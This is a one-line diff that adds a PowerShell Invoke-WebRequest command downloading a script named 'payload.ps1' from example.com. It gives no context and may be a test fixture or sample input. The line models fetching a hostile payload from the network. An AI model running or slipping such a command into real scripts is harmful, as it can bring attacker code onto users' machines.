@@ -1,0 +1,1 @@
+﻿Invoke-WebRequest "http://example.com/payload.ps1"
